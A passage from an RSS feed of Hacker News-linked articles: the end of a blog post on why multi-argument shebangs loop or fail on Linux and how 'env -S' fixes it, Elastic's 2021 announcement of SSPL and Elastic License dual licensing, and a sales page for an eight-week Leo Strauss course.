<h2 id="the-multiple-argument-shebang-papercut">the multiple argument shebang papercut</h2>

<p>You can think of the shebang <code>#!/usr/bin/env ruby --enable=jit</code> as having two parts:</p>

<ul>
<li>The “interpreter name”, <code>/usr/bin/env</code>, which is a path to the script’s
interpreter</li>
<li>The remainder, <code>ruby --enable=jit</code></li>
</ul>

<p>Among other differences in shebangs, Linux and macOS treat the remainder
differently.  Linux parses the remainder into exactly one argument.  In our
<code>./hello</code> example, Linux parses the shebang’s remainder to <code>"ruby
--enable=jit"</code>, combines it with the user’s arguments <code>{"./hello"}</code>, and
executes <code>"/usr/bin/env"</code> with arguments <code>{"/usr/bin/env", "ruby --enable=jit",
"./hello"}</code>.</p>

<p>macOS splits the remainder into several arguments if there are spaces.  For
<code>./hello</code>, macOS parses the remainder to <code>{"ruby", "--enable=jit"}</code> and
executes <code>"/usr/bin/env"</code> with arguments <code>{"env", "ruby", "--enable=jit",
"./hello"}</code>.</p>

<p>It seems like the script would fail on Linux with this shebang, because it’s
not asking <code>env</code> to find and run <code>ruby</code>.  But it’s not saying something like,
<code>program not found: ruby --enable=jit</code>, it’s hanging in that loop.  Something
else is afoot.</p>

<h2 id="the-usr-bin-env-shebang-papercut">the #!/usr/bin/env shebang papercut</h2>

<p>The first papercut doesn’t fully explain this loopy behavior.  Another
paper-sharp shebang, which also tries to pass two arguments to <code>/usr/bin/env</code>,
fails differently on Linux:</p>

<pre><code>#!/usr/bin/env ruby --verbose

echo "Goodbye, world"
</code></pre>

<pre><code>you@yourbox:~$ ./goodbye
/usr/bin/env: ‘ruby --verbose’: No such file or directory
</code></pre>

<p>The difference is in the <code>=</code> character.  Besides finding the first interpreter
on a user’s <code>PATH</code>, <code>env</code> has another use: to “run a program in a modified
environment”.  One way it does this is to take arguments of the form
<code>VARIABLE=VALUE</code> before the program and its arguments, and set those
environment variables in the executed program’s process.  For instance:</p>

<pre><code>you@yourbox:~$ env DISPLAY=:0 xeyes -fg dodgerblue
</code></pre>

<p>executes <code>{"xeyes", "-fg", "dodgerblue"}</code> with the shell’s environment, plus
the environment variable <code>"DISPLAY"</code> set to <code>":0"</code>.</p>

<p>Combining these papercuts, when Linux comes to execute <code>./hello</code>:</p>

<ol>
<li>An <code>exec</code>-family function reads <code>"./hello"</code>’s contents and parses the
 shebang into <code>{"/usr/bin/env", "ruby --enable=jit"}</code>.</li>
<li>The parsed shebang is combined with the <code>argv</code> passed to <code>exec*()</code> to
 ultimately execute <code>{"/usr/bin/env", "ruby --enable=jit", "./hello"}</code>.</li>
<li><code>env</code> parses its arguments, sets the environment variable <code>"ruby
 --enable"</code> to the value <code>"jit"</code> and executes the program <code>"./hello"</code>.</li>
<li><code>GOTO 1</code></li>
</ol>

<p><code>./goodbye</code> fails differently because <code>env</code> interprets the argument <code>ruby
--verbose</code> as the program to run, since there’s no <code>=</code> character in it.</p>

<h2 id="the-thimble">the thimble</h2>

<p>Fortunately, modern versions of <code>env</code> have a solution.  macOS and FreeBSD
support the <code>-S</code> option, which does, quote the macOS manual:</p>

<pre><code>   -S string
           Split apart the given string into multiple strings, and process each of the
           resulting strings as separate arguments to the env utility.  The -S option
           recognizes some special character escape sequences and also supports environment-
           variable substitution, as described below.
</code></pre>

<p>On Linux, GNU’s coreutils added the same flag to <code>env</code> in version <a href="https://savannah.gnu.org/forum/forum.php?forum_id=9187" target="_blank">8.30</a>,
released July 2018.</p>

<p>So you can write a fancy, optionful shebang like:</p>

<pre><code>#!/usr/bin/env -S ruby --enable=jit --verbose

puts "Hello, world!"
</code></pre>

<p>And <code>./hello</code> will execute what you intended.</p>

<h2 id="references">references</h2>

<p>Andries E. Brouwer posted a good <a href="https://homepages.cwi.nl/~aeb/std/hashexclam-1.html" target="_blank">writeup</a> of shebang behavior on many
unix-ish platforms.</p>

<h2 id="updates">updates</h2>

<ul>
<li>2019-11-20: corrected which GNU coreutils version added <code>env -S</code> and changed
link to savannah</li>
</ul>

</article>

    </div></div>]]>
            </description>
            <link>https://www.crystae.net/posts/2019/11/08/two-shebang-papercuts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776807</guid>
            <pubDate>Thu, 14 Jan 2021 14:41:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Licensing changes to Elasticsearch and Kibana]]>
            </title>
            <description>
<![CDATA[
Score 266 | Comments 317 (<a href="https://news.ycombinator.com/item?id=25776657">thread link</a>) | @sl_
<br/>
January 14, 2021 | https://www.elastic.co/blog/licensing-change | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/licensing-change">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><h2>Upcoming licensing changes to Elasticsearch and Kibana</h2><p>We are moving our Apache 2.0-licensed source code in Elasticsearch and Kibana to be dual licensed under Server Side Public License (SSPL) and the Elastic License, giving users the choice of which license to apply. This license change ensures our community and customers have free and open access to use, modify, redistribute, and collaborate on the code. It also protects our continued investment in developing products that we distribute for free and in the open by restricting cloud service providers from offering Elasticsearch and Kibana as a service without contributing back. This will apply to all maintained branches of these two products and will take place before our upcoming 7.11 release. Our releases will continue to be under the Elastic License as they have been for the last three years.
</p><p>This change in source code licensing has <b>no impact on the overwhelming majority of our user community</b> who use our default distribution for free. It also has <b>no impact on our cloud customers or self-managed software customers</b>.</p><p>In recent years, the market has evolved, and the community has come to appreciate that open source companies need to better protect their software to continue to innovate and make the investments required. As companies continue the shift to SaaS offerings, some cloud service providers have taken open source products and provided them as a service without investing back into the community. Moving to the dual license strategy with <a href="https://www.mongodb.com/licensing/server-side-public-license">SSPL</a> or the Elastic License is a natural next step for us after opening our commercial code and creating a free tier, all under the Elastic License, nearly 3 years ago. It is similar to those made by many other open source companies over these years, including <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">MongoDB</a>, which developed the SSPL. The SSPL allows free and unrestricted use, as well as modification, with the simple requirement that if you provide the product as a service, you must also publicly release any modifications as well as the source code of your management layers  under SSPL.
</p><h2>Our open origins</h2><p>My personal journey with open source goes a long way back. In 2005, I open sourced my first project, Compass, to provide a Java framework on top of Apache Lucene while I was building a recipe app for my wife. In the following five years, I invested many weekends and nights working on it, from writing code to helping users with bugs, features, and questions.
</p><p>I had no idea what I was signing up for, especially with a day job “on the side,” but I fell in love with the opportunity to make such a positive impact — trying to build a great product, but more importantly, a great community around it, through the power of open source.
</p><p>In 2009, I decided to do it again, and started to write a brand new project called Elasticsearch. I spent many nights and weekends building it, and in 2010 open sourced it. I even quit my job and decided to dedicate my full attention to it. To be there for the users, through writing code, and engaging on GitHub, mailing lists, and IRC.
</p><p>And when we founded Elastic as a company in 2012, we brought the same spirit to our company. We invested heavily in our free and open products, and supported the rapid growth of our community of users. We expanded from just Elasticsearch to Kibana, Logstash, Beats, and now a complete set of solutions built into the Elastic Stack: Elastic Enterprise Search, Observability, and Security.
</p><p>We have matured the products, fostered vibrant communities around them, and focused on providing the greatest amount of value to our users. Today, we have hundreds of engineers who wake up every day and work to make our products even better. And we have hundreds of thousands of community members who engage with us and contribute to our shared success.
</p><p>I am proud of the company we built, and humbled by the level of trust that we have earned with our user base. This starts by being open and transparent, and continues with being true to our community and user base in our choices.
</p><h2>Free and open FTW</h2><p>Back in 2018, we <a href="https://www.elastic.co/blog/doubling-down-on-open">opened the code of our free and paid proprietary features</a> under the Elastic License, a source-available license, and we changed our default distribution to include all of our features, with all free features enabled by default.
</p><p>We did this for a few reasons. It allowed us to engage with our paying customers in the same way we engage with our community: in the open. It also allowed us to build free features that empower our users without providing those capabilities to companies that take our products and provide them as a service, like Amazon Elasticsearch Service, and profit from our open source software without contributing back.
</p><p>This approach was well received — today, over 90% of new downloads choose this distribution — and has allowed us to make so much of our work available for free while also building a successful company.
</p><p>The list of improvements under this new free and open, yet proprietary, license, is overwhelming. I am humbled by the amazing progress our team and community has made across all our products, so much so that I would love to share some of them:
</p><p>We've dramatically improved the speed, scalability, and reliability of Elasticsearch, with a new distributed consensus algorithm and significantly reduced memory usage, in addition to new data storage and compression approaches that have reduced the typical index size by nearly 40% while improving indexing and query throughput. We added new field types for geospatial analysis, and more efficient ways to store and search logs and perform fast, case-insensitive search on security data. In Kibana, we cut load time by 80% and eliminated whole-page refreshes thanks to a multiyear replatforming project, while at the same time introducing an intuitive drag-and-drop data visualization experience with Kibana Lens, key capabilities like dashboard drill-downs, and so much more.
</p><p>Over the last three years, we also built first-class experiences around our most common use cases. In the security area, we created a free and open SIEM right inside Kibana, with a powerful detection engine that supports simple rules as well as complex correlations via a new query language called EQL in Elasticsearch. We include hundreds of detection rules, which we develop publicly, in collaboration with our community. And we joined forces with Endgame, a leading endpoint security company, and have released powerful malware protection for free as part of the Elastic Agent, our unified, centrally managed observability and security agent for servers and endpoints, with more to come.
</p><p>In observability, the story is similar. We've built an entire observability suite right inside Kibana — from a live-tail logging UI to an intuitive infrastructure-level view of the key metrics and alerts across your hosts, pods, and containers. And we now have a fully featured APM product with open source data collectors and agents, supporting OpenTelemetry, real user monitoring (RUM), synthetic monitoring, and the recent addition of user experience monitoring.
</p><p>With Elastic Enterprise Search, we introduced App Search, a layer on top of Elasticsearch that simplifies building rich applications and provides powerful management interfaces for relevance tuning, as well as analytics on how it's being used. We also provide a free Workplace Search product that makes it easy to integrate and search the content sources that you use to run your life or company, like Google Workplace, Microsoft 365, Atlassian Jira and Confluence, and Salesforce.
</p><p>It is simply amazing that we've been able to build all of these capabilities and provide them for free to our community. It has been humbling to see the level of engagement and adoption around our products and how these new features have helped so many people and businesses succeed. And this was possible because the overwhelming majority of our community chose our default distribution under the Elastic License, where all these features are free and open.
</p><h2>Why change?</h2><p>As previously mentioned, over the last three years, the market has evolved and the community has come to appreciate that open source companies need to better protect their software in order to maintain a high level of investment and innovation. With the shift to SaaS as a delivery model, some cloud service providers have taken advantage of open source products by providing them as a service, without contributing back. This diverts funds that would have been reinvested into the product and hurts users and the community.
</p><p>Similar to our open source peers, we have lived this experience firsthand, from our trademarks being misused to outright attempts to splinter our community with “open” repackaging of our OSS products or even taking “inspiration” from our proprietary code. While each open source company has taken a slightly different approach to address this issue, they have generally modified their open source license in order to protect their investment in free software, while trying to preserve the principles of openness, transparency, and collaboration. Similarly, we are taking the natural next step of making a targeted change to how we license our source code. This change won't affect the vast majority of our users, but it will restrict cloud service providers from offering our software as a service.
</p><p>We expect that a few of our competitors will attempt to spread all kinds of FUD around this change. Let me be clear to any naysayers. We believe deeply in the principles of free and open products, and of transparency with the community. Our track record speaks to this commitment, and we will continue to build upon it.
</p><h2>The change</h2><p>Starting with the upcoming Elastic 7.11 release, we will be moving the Apache 2.0-licensed code of Elasticsearch and Kibana to be dual licensed under SSPL and the Elastic License, giving users the choice of which license to apply. SSPL is a source-available license created by MongoDB to embody the principles …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.elastic.co/blog/licensing-change">https://www.elastic.co/blog/licensing-change</a></em></p>]]>
            </description>
            <link>https://www.elastic.co/blog/licensing-change</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776657</guid>
            <pubDate>Thu, 14 Jan 2021 14:29:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Philosophy of Leo Strauss: An 8-week course]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776565">thread link</a>) | @jmrphy
<br/>
January 14, 2021 | https://otherlife.co/strauss/ | <a href="https://web.archive.org/web/*/https://otherlife.co/strauss/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">








<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Other Life">
<meta property="og:title" content="Leo Strauss: The Course">
<meta property="og:url" content="https://otherlife.co/strauss/">
<meta property="og:type" content="article">
<meta property="og:description" content="Master Leo Strauss, develop your own work, and make lasting intellectual friendships over the course of 8 weeks.">
<meta property="og:image" content="https://otherlife.co/wp-content/uploads/2021/01/Screen-Shot-2020-12-13-at-7.26.18-PM.png">
<meta property="og:image:url" content="https://otherlife.co/wp-content/uploads/2021/01/Screen-Shot-2020-12-13-at-7.26.18-PM.png">
<meta property="og:image:secure_url" content="https://otherlife.co/wp-content/uploads/2021/01/Screen-Shot-2020-12-13-at-7.26.18-PM.png">


<meta name="twitter:title" content="Leo Strauss: The Course">
<meta name="twitter:url" content="https://otherlife.co/strauss/">
<meta name="twitter:description" content="Master Leo Strauss, develop your own work, and make lasting intellectual friendships over the course of 8 weeks.">
<meta name="twitter:image" content="https://otherlife.co/wp-content/uploads/2021/01/Screen-Shot-2020-12-13-at-7.26.18-PM.png">
<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@jmrphy">


<meta name="description" content="Master Leo Strauss, develop your own work, and make lasting intellectual friendships over the course of 8 weeks.">
<meta name="author" content="jmrphy">
<meta name="publisher" content="Other Life">












<section id="section-92-3695"><div><h2 id="headline-93-3695">Master Leo Strauss in 8 Weeks</h2><p>Develop your own ideas and form lasting intellectual relationships, too.</p><div id="video-658-3887">
<p><iframe src="https://www.youtube.com/embed/OlLImhgEumg" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe></p>
</div></div></section><section id="featuresection"><div><h2 id="features">Features</h2><div id="new_columns-95-3695"><div id="div_block-96-3695"><h4 id="headline-98-3695">CONTENT</h4><p>7 recorded lectures (video+audio+text)</p><h4 id="headline-101-3695">DISCUSSION</h4><p>Live group seminars, weekly.</p><h4 id="headline-104-3695">COMMUNITY</h4><p>A private forum for participants.</p></div><div id="div_block-106-3695"><p><img id="image-107-3695" alt="Socrates drinking hemlock" src="https://otherlife.co/wp-content/uploads/2021/01/Crane-He_drank_the_contents_as_though_it_were_a_draught_of_Wine-742x1024-1.jpg"></p><p>Socrates takes the hemlock.</p></div><div id="div_block-108-3695"><h4 id="headline-110-3695">NETWORK</h4><p>Meet other lecturers, course participants, and more than 250 other indie thinkers.</p><h4 id="headline-113-3695">DEVELOP YOUR WORK</h4><p>We provide support structures.</p><h4 id="headline-116-3695">SHARE YOUR WORK</h4><p>Give a public talk (optional).</p></div></div></div></section><section id="testimonialsection"><div><h2 id="testimonials">Testimonials</h2><p>Feedback on previous Other Life courses.</p><div id="new_columns-441-3695"><div id="div_block-442-3695"><div id="div_block-443-3695"><p><img id="image-444-3695" alt="" src="https://theotherlifenow.com/wp-content/uploads/2020/06/10014706_10101677079790518_7341119920863537842_n.jpg"></p><p>Composer, Los Angeles</p><p>"I appreciated Justin's ability to clarify and suggest practical applications of Deleuze. I enjoyed the lectures and will be revisiting them in the future. The course discussions were well facilitated, encouraging an atmosphere of fellowship and open dialogue."</p></div></div><div id="div_block-449-3695"><div id="div_block-450-3695"><p><img id="image-451-3695" alt="" src="https://theotherlifenow.com/wp-content/uploads/2020/06/U9IZetFm_400x400.jpg"></p><h4 id="headline-452-3695">Raven Connolly</h4><div id="text_block-453-3695"><p>Hostess of <a href="https://www.thestoa.ca/">The Stoa</a>, Portland</p></div><p>"My thinking was challenged, exposed, and reshaped... Justin's social network brings together rogue intellectuals, experimental musicians, martial arts teachers, conceptual artists and entrepreneurs from all over the globe. Collaborations have outlasted the length of the course."</p></div></div><div id="div_block-456-3695"><div id="div_block-457-3695"><p><img id="image-458-3695" alt="" src="https://theotherlifenow.com/wp-content/uploads/2020/06/image0-3.jpeg"></p><h4 id="headline-459-3695">Kevin McCoy</h4><p>Artist, New York City</p><p>"Justin brings people and ideas together in a great way. He sets up a dynamic conversation between his co-teachers and the course participants, one that continues long after the class is finished."</p></div></div></div></div></section><section id="lecturersection"><div><h2 id="lecturers">Lecturer</h2><p>Michael Millerman has published extensively on Leo Strauss and taught political theory for several years, inside and outside the academy.</p><div id="div_block-472-3695"><div id="div_block-473-3695"><p><img id="image-474-3695" alt="" src="https://otherlife.co/wp-content/uploads/2021/01/Millerman-Headshot.jpg"></p><h4 id="headline-475-3695">Michael Millerman, PhD</h4><p>Political Theorist</p></div></div></div></section><section id="howsection"><div><h2 id="headline-496-3695">How it works</h2><div id="new_columns-498-3695"><div id="div_block-499-3695"><p><b>Leo Strauss</b> (1899–1973) was a&nbsp;German-Jewish political theorist who influenced everyone from Peter Thiel to Paul Wolfowitz and a whole school of academic political theorists.&nbsp;The purpose of this course is to explain and develop most of Strauss's main themes: German Postwar Philosophy, Nihilism, Reason and Revelation,&nbsp;Classical vs. Modern Political Philosophy,&nbsp;Reading and Writing, Tyranny, Education,&nbsp;and Persecution.</p><p><b>Content.</b> When you enroll, you're given an 8-week reading list on the themes listed above. You're also given 7 pre-recorded lectures&nbsp;(videos as well as text and podcast equivalents). All course content is hosted within the course website.</p></div><div id="div_block-502-3695"><p><b>Community.</b>&nbsp;After enrolling you will also receive an email inviting you to join a private community forum, accessible only to participants in the course.<br></p><p><b>Network.</b> The private course community is hosted by <a href="https://indiethinkers.org/">IndieThinkers.org,</a> a larger network of independent intellectuals and creators. When you're invited to create an account for the private course community, you'll see it's embedded in a broader forum and social network including other lecturers, authors, podcasters, Youtubers, etc.<br></p></div><div id="div_block-504-3695"><p><b>Seminars.</b> If you enroll in a tier including discussion seminars, you'll find links to each discussion seminar inside the course website. The seminars are conducted via <a href="https://zoom.us/">Zoom</a>, which you'll need to download once (free). Every Saturday at 12pm Eastern from January 23 to March 13, 2020. Final seminar is the Proseminar (a public panel discussion).<br></p><p><b>Email.</b>&nbsp;Course communications take place in the community forum or by email. It's important you check your email and the forum regularly, in case any last minute tweaks are necessary. Check emails are not going to your spam folder, and if they are, add our sending email to your address book.</p></div></div></div></section><section id="pricingsection"><div><h2 id="pricing">Pricing</h2><div id="new_columns-178-3695"><div id="div_block-179-3695"><div id="div_block-180-3695"><p>7 Lectures (Video, Text, and Audio)</p><p>Private Community Forum</p><p>IndieThinkers.org Network</p><p>Lifetime Course Updates</p><p>$300</p><p><a id="link_text-189-3695" href="https://courses.theotherlifenow.com/purchase?product_id=2782843" target="_self">ENROLL</a></p></div></div><div id="div_block-190-3695"><div id="div_block-191-3695"><p>7 Lectures (Video, Text, and Audio)<br></p><p>Private Community Forum</p><p>IndieThinkers.org Network</p><p>Lifetime Course Updates</p><p><b>Live Weekly Discussion Seminars (8 Weeks)</b></p><p><b>Invitation to the Proseminar (<a href="https://www.youtube.com/watch?v=xFzoV8W7b3M&amp;feature=youtu.be">Example</a>)</b></p><p>$600</p><p><a id="link_text-201-3695" href="https://courses.theotherlifenow.com/purchase?product_id=2782844" target="_self">ENROLL</a></p></div></div><div id="div_block-202-3695"><div id="div_block-203-3695"><p>7 Lectures (Video, Text, and Audio)</p><p>Private Community Forum</p><p>IndieThinkers.org Network</p><p>Lifetime Course Updates</p><p><b>Live Weekly Discussion Seminars (8 Weeks)</b></p><p><b>Invitation to the Proseminar (<a href="https://www.youtube.com/watch?v=xFzoV8W7b3M&amp;feature=youtu.be">Example</a>)</b></p><p><b>1-1 Calls with Lecturer (3x)</b></p><p><b>One-Year Pro Membership in IndieThinkers.org<br></b></p><p>$1500</p><p><a id="link_text-214-3695" href="https://courses.theotherlifenow.com/purchase?product_id=2782848" target="_self">ENROLL</a></p></div></div></div></div></section><section id="learnsection"></section><section id="section-42-2343"><div><div id="new_columns-43-2343"><div id="div_block-44-2343"><p>The content of this website is <a href="https://creativecommons.org/licenses/by/4.0/">licensed</a> under a CREATIVE COMMONS ATTRIBUTION 4.0 INTERNATIONAL LICENSE. The Privacy Policy can be found <a href="https://otherlife.co/privacy-policy/">here</a>. This site participates in the Amazon Services LLC Associates Program, an affiliate advertising program designed to provide a means for us to earn fees by linking to Amazon.com and affiliated sites.</p></div></div></div></section> 


<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1"><defs><symbol id="FontAwesomeicon-eye" viewBox="0 0 32 32"><title>eye</title><path d="M29.714 17.143q-2.714-4.214-6.804-6.304 1.089 1.857 1.089 4.018 0 3.304-2.348 5.652t-5.652 2.348-5.652-2.348-2.348-5.652q0-2.161 1.089-4.018-4.089 2.089-6.804 6.304 2.375 3.661 5.955 5.83t7.759 2.17 7.759-2.17 5.955-5.83zM16.857 10.286q0-0.357-0.25-0.607t-0.607-0.25q-2.232 0-3.83 1.598t-1.598 3.83q0 0.357 0.25 0.607t0.607 0.25 0.607-0.25 0.25-0.607q0-1.536 1.089-2.625t2.625-1.089q0.357 0 0.607-0.25t0.25-0.607zM32 17.143q0 0.607-0.357 1.232-2.5 4.107-6.723 6.58t-8.92 2.473-8.92-2.482-6.723-6.571q-0.357-0.625-0.357-1.232t0.357-1.232q2.5-4.089 6.723-6.571t8.92-2.482 8.92 2.482 6.723 6.571q0.357 0.625 0.357 1.232z"></path></symbol><symbol id="FontAwesomeicon-flask" viewBox="0 0 30 32"><title>flask</title><path d="M27.268 25.857q1 1.589 0.384 2.723t-2.509 1.134h-20.571q-1.893 0-2.509-1.134t0.384-2.723l8.982-14.161v-7.125h-1.143q-0.464 0-0.804-0.339t-0.339-0.804 0.339-0.804 0.804-0.339h9.143q0.464 0 0.804 0.339t0.339 0.804-0.339 0.804-0.804 0.339h-1.143v7.125zM13.357 12.911l-4.857 7.661h12.714l-4.857-7.661-0.357-0.554v-7.786h-2.286v7.786z"></path></symbol><symbol id="FontAwesomeicon-microphone" viewBox="0 0 21 32"><title>microphone</title><path d="M20.571 12.571v2.286q0 3.946-2.634 6.866t-6.509 3.348v2.357h4.571q0.464 0 0.804 0.339t0.339 0.804-0.339 0.804-0.804 0.339h-11.429q-0.464 0-0.804-0.339t-0.339-0.804 0.339-0.804 0.804-0.339h4.571v-2.357q-3.875-0.429-6.509-3.348t-2.634-6.866v-2.286q0-0.464 0.339-0.804t0.804-0.339 0.804 0.339 0.339 0.804v2.286q0 3.304 2.348 5.652t5.652 2.348 5.652-2.348 2.348-5.652v-2.286q0-0.464 0.339-0.804t0.804-0.339 0.804 0.339 0.339 0.804zM16 5.714v9.143q0 2.357-1.679 4.036t-4.036 1.679-4.036-1.679-1.679-4.036v-9.143q0-2.357 1.679-4.036t4.036-1.679 4.036 1.679 1.679 4.036z"></path></symbol></defs></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1"><defs><symbol id="Lineariconsicon-home" viewBox="0 0 20 20"><title>home</title><path d="M19.871 12.165l-8.829-9.758c-0.274-0.303-0.644-0.47-1.042-0.47-0 0 0 0 0 0-0.397 0-0.767 0.167-1.042 0.47l-8.829 9.758c-0.185 0.205-0.169 0.521 0.035 0.706 0.096 0.087 0.216 0.129 0.335 0.129 0.136 0 0.272-0.055 0.371-0.165l2.129-2.353v8.018c0 0.827 0.673 1.5 1.5 1.5h11c0.827 0 1.5-0.673 1.5-1.5v-8.018l2.129 2.353c0.185 0.205 0.501 0.221 0.706 0.035s0.221-0.501 0.035-0.706zM12 19h-4v-4.5c0-0.276 0.224-0.5 0.5-0.5h3c0.276 0 0.5 0.224 0.5 0.5v4.5zM16 18.5c0 0.276-0.224 0.5-0.5 0.5h-2.5v-4.5c0-0.827-0.673-1.5-1.5-1.5h-3c-0.827 0-1.5 0.673-1.5 1.5v4.5h-2.5c-0.276 0-0.5-0.224-0.5-0.5v-9.123l5.7-6.3c0.082-0.091 0.189-0.141 0.3-0.141s0.218 0.050 0.3 0.141l5.7 6.3v9.123z"></path></symbol><symbol id="Lineariconsicon-pencil" viewBox="0 0 20 20"><title>pencil</title><path d="M19.104 0.896c-0.562-0.562-1.309-0.871-2.104-0.871s-1.542 0.309-2.104 0.871l-12.75 12.75c-0.052 0.052-0.091 0.114-0.116 0.183l-2 5.5c-0.066 0.183-0.021 0.387 0.116 0.524 0.095 0.095 0.223 0.146 0.354 0.146 0.057 0 0.115-0.010 0.171-0.030l5.5-2c0.069-0.025 0.131-0.065 0.183-0.116l12.75-12.75c0.562-0.562 0.871-1.309 0.871-2.104s-0.309-1.542-0.871-2.104zM5.725 17.068l-4.389 1.596 1.596-4.389 11.068-11.068 2.793 2.793-11.068 11.068zM18.396 4.396l-0.896 0.896-2.793-2.793 0.896-0.896c0.373-0.373 0.869-0.578 1.396-0.578s1.023 0.205 1.396 0.578c0.373 0.373 0.578 0.869 0.578 1.396s-0.205 1.023-0.578 1.396z"></path></symbol><symbol id="Lineariconsicon-film-play" viewBox="0 0 20 20"><title>film-play</title><path d="M7.5 15c-0.076 0-0.153-0.017-0.224-0.053-0.169-0.085-0.276-0.258-0.276-0.447v-9c0-0.189 0.107-0.363 0.276-0.447s0.372-0.066 0.524 0.047l6 4.5c0.126 0.094 0.2 0.243 0.2 0.4s-0.074 0.306-0.2 0.4l-6 4.5c-0.088 0.066-0.194 0.1-0.3 0.1zM8 6.5v7l4.667-3.5-4.667-3.5z"></path><path d="M19.5 2h-19c-0.276 0-0.5 0.224-0.5 0.5v15c0 0.276 0.224 0.5 0.5 0.5h19c0.276 0 0.5-0.224 0.5-0.5v-15c0-0.276-0.224-0.5-0.5-0.5zM3 11h-2v-2h2v2zM3 8h-2v-2h2v2zM1 12h2v2h-2v-2zM4 3h12v14h-12v-14zM17 9h2v2h-2v-2zM17 8v-2h2v2h-2zM17 12h2v2h-2v-2zM19 5h-2v-2h2v2zM3 3v2h-2v-2h2zM1 15h2v2h-2v-2zM17 17v-2h2v2h-2z"></path></symbol><symbol id="Lineariconsicon-heart-pulse" viewBox="0 0 20 20"><title>heart-pulse</title><path d="M9.5 19c-0.084 0-0.167-0.021-0.243-0.063-0.116-0.065-2.877-1.611-5.369-4.082-0.196-0.194-0.197-0.511-0.003-0.707s0.511-0.197 0.707-0.003c1.979 1.962 4.186 3.346 4.908 3.776 0.723-0.431 2.932-1.817 4.908-3.776 0.196-0.194 0.513-0.193 0.707 0.003s0.193 0.513-0.003 0.707c-2.493 2.471-5.253 4.017-5.369 4.082-0.076 0.042-0.159 0.063-0.243 0.063z"></path><path d="M1.279 11c-0.188 0-0.368-0.106-0.453-0.287-0.548-1.165-0.826-2.33-0.826-3.463 0-2.895 2.355-5.25 5.25-5.25 0.98 0 2.021 0.367 2.931 1.034 0.532 0.39 0.985 0.86 1.319 1.359 0.334-0.499 0.787-0.969 1.319-1.359 0.91-0.667 1.951-1.034 2.931-1.034 2.895 0 5.25 2.355 5.25 5.25 0 1.133-0.278 2.298-0.826 3.463-0.118 0.25-0.415 0.357-0.665 0.24s-0.357-0.415-0.24-0.665c0.485-1.031 0.731-2.053 0.731-3.037 0-2.343-1.907-4.25-4.25-4.25-1.703 0-3.357 1.401-3.776 2.658-0.068 0.204-0.259 0.342-0.474 0.342s-0.406-0.138-0.474-0.342c-0.419-1.257-2.073-2.658-3.776-2.658-2.343 0-4.25 1.907-4.25 4.25 0 0.984 0.246 2.006 0.731 3.037 0.118 0.25 0.010 0.548-0.24 0.665-0.069 0.032-0.141 0.048-0.212 0.048z"></path><path d="M10.515 15c-0.005 0-0.009-0-0.013-0-0.202-0.004-0.569-0.109-0.753-0.766l-1.217-4.334-0.807 3.279c-0.158 0.643-0.525 0.778-0.73 0.8s-0.592-0.027-0.889-0.62l-0.606-1.211c-0.029-0.058-0.056-0.094-0.076-0.117-0.003 0.004-0.007 0.009-0.011 0.015-0.37 0.543-1.192 0.953-1.913 0.953h-1c-0.276 0-0.5-0.224-0.5-0.5s0.224-0.5 0.5-0.5h1c0.421 0 0.921-0.272 1.087-0.516 0.223-0.327 0.547-0.501 0.891-0.478 0.374 0.025 0.708 0.279 0.917 0.696l0.445 0.89 0.936-3.803c0.158-0.64 0.482-0.779 0.726-0.783s0.572 0.125 0.751 0.76l1.284 4.576 1.178-3.608c0.205-0.628 0.582-0.736 0.788-0.745s0.59 0.068 0.847 0.677l0.724 1.719c0.136 0.322 0.578 0.616 0.927 0.616h1.5c0.276 0 0.5 0.224 0.5 0.5s-0.224 0.5-0.5 0.5h-1.5c-0.747 0-1.559-0.539-1.849-1.228l-0.592-1.406-1.274 3.9c-0.207 0.634-0.566 0.733-0.771 0.733z"></path></symbol><symbol id="Lineariconsicon-earth" viewBox="0 0 20 20"><title>earth</title><path d="M17.071 2.929c-1.889-1.889-4.4-2.929-7.071-2.929s-5.182 1.040-7.071 2.929c-1.889 1.889-2.929 4.4-2.929 7.071s1.040 5.182 2.929 7.071c1.889 1.889 4.4 2.929 7.071 2.929s5.182-1.040 7.071-2.929c1.889-1.889 2.929-4.4 2.929-7.071s-1.040-5.182-2.929-7.071zM18.397 6.761c-0.195-0.351-0.685-0.518-1.325-0.736-0.687-0.234-0.93-0.94-1.211-1.758-0.244-0.71-0.496-1.443-1.095-1.899 1.639 1.027 2.924 2.567 3.631 4.393zM15.591 10.191c0.076 0.677 0.154 1.378-0.687 2.322-0.227 0.255-0.36 0.61-0.501 0.986-0.326 0.871-0.634 1.694-1.946 1.706-0.037-0.044-0.141-0.21-0.234-0.733-0.085-0.482-0.134-1.106-0.187-1.765-0.080-1.012-0.171-2.16-0.421-3.112-0.32-1.217-0.857-1.936-1.641-2.198-0.342-0.114-0.692-0.17-1.068-0.17-0.278 0-0.53 0.030-0.752 0.056-0.173 0.020-0.337 0.040-0.475 0.040 0 0-0 0-0 0-0.234 0-0.499 0-0.826-0.748-0.469-1.075-0.123-2.798 1.254-3.707 0.755-0.498 1.276-0.711 1.742-0.711 0.372 0 0.773 0.129 1.342 0.433 0.672 0.358 1.199 0.404 1.583 0.404 0.152 0 0.29-0.008 0.423-0.016 0.112-0.007 0.217-0.013 0.315-0.013 0.22 0 0.398 0.029 0.607 0.171 0.385 0.263 0.585 0.844 0.796 1.458 0.32 0.932 0.683 1.988 1.835 2.38 0.155 0.053 0.421 0.143 0.61 0.222-0.163 0.168-0.435 